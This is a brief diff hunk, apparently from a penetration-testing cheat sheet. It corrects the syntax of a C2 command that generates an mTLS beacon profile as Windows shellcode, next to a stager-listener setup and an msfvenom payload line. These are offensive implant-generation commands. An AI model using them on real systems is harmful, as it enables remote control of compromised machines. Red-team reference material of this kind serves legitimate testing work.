@@ -2719,7 +2719,7 @@ msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --plat
 Metasploit
 ```
 # Generate Profile
-new beacon --mtls 192.168.1.1:443 --format shellcode win-shellcode
+profiles new beacon --mtls 192.168.1.1:443 --format shellcode win-shellcode
 
 # Setup Stager Listener
 stage-listener --url http://192.168.1.1:1234 --profile win-shellcode --prepend-size
